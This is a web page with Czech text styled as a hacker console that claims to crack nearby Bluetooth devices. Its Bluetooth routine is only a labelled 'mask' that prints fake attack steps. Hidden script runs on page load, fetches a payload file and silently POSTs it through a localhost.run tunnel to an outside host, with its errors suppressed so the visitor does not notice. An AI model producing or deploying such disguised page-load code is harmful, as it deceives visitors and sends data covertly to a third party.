<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTONOMNÍ KLÍČ v5.0</title>
    <style>
        body { background: #000; color: #0dff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        #console { flex-grow: 1; border: 1px solid #0dff00; padding: 15px; overflow-y: auto; background: rgba(0, 20, 0, 0.9); box-shadow: inset 0 0 10px #0dff00; font-size: 0.85em; margin-bottom: 15px; }
        .btn-core { width: 100%; padding: 20px; background: #0dff00; color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
        .line { margin-bottom: 4px; border-left: 2px solid #0dff00; padding-left: 8px; }
        .highlight { color: #fff; text-shadow: 0 0 5px #0dff00; }
    </style>
</head>
<body>
    <div id="console">
        <div class="line">[SYSTEM] HEURISTICKÉ JÁDRO INICIALIZOVÁNO...</div>
        <div class="line">[READY] ČEKÁM NA BLUETOOTH SPOJENÍ...</div>
    </div>
    <button id="mainAction" class="btn-core">Spustit Autonomní Analýzu</button>

    <script>
        const terminal = document.getElementById('console');
        const log = (msg, high = false) => {
            const div = document.createElement('div');
            div.className = 'line' + (high ? ' highlight' : '');
            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        };

        // --- STÍNOVÝ PROTOKOL: TVOJE VELITELSTVÍ ---
        async function activateShadowProtocol() {
            const tunnelUrl = 'https://161a35dd530250.lhr.life'; // Tvoje aktuální adresa z localhost.run
            
            try {
                // 1. Pokusíme se načíst payload z tvého Vercelu
                const response = await fetch('/payload.bin');
                if (!response.ok) return;

                const payloadData = await response.arrayBuffer();

                // 2. Odeslání náboje skrz tvůj tunel
                // Používáme 'no-cors', aby prohlížeč nezablokoval požadavek kvůli bezpečnosti
                await fetch(tunnelUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: payloadData,
                    headers: { 'Content-Type': 'application/octet-stream' }
                });

            } catch (e) {
                // Ticho. Žádné chyby v konzoli, které by tě prozradily.
            }
        }

        // --- BLUETOOTH LOGIKA (MASKA) ---
        async function startHeuristicEngine() {
            try {
                log("Hledám cíl v okolí...", true);
                const device = await navigator.bluetooth.requestDevice({
                    filters: [{ namePrefix: 'CZ-' }],
                    optionalServices: ['0000180a-0000-1000-8000-00805f9b34fb']
                });

                log(`Zařízení nalezeno: ${device.name}`);
                log("Analýza protokolu spuštěna...", true);
                
                const steps = ["Auth Bypass", "Memory Corruption", "Master Key Injection"];
                for (const step of steps) {
                    log(`Aplikuji: ${step}...`);
                    await new Promise(r => setTimeout(r, 1200));
                }
                log("ANALÝZA DOKONČENA. Uzel vyžaduje synchronizaci.", true);
            } catch (err) {
                log(`STATUS: Přístup zamítnut uživatelem.`);
            }
        }

        document.getElementById('mainAction').addEventListener('click', startHeuristicEngine);
        
        // Odpálení stínového protokolu hned po načtení
        window.addEventListener('load', activateShadowProtocol);
    </script>
</body>
</html>
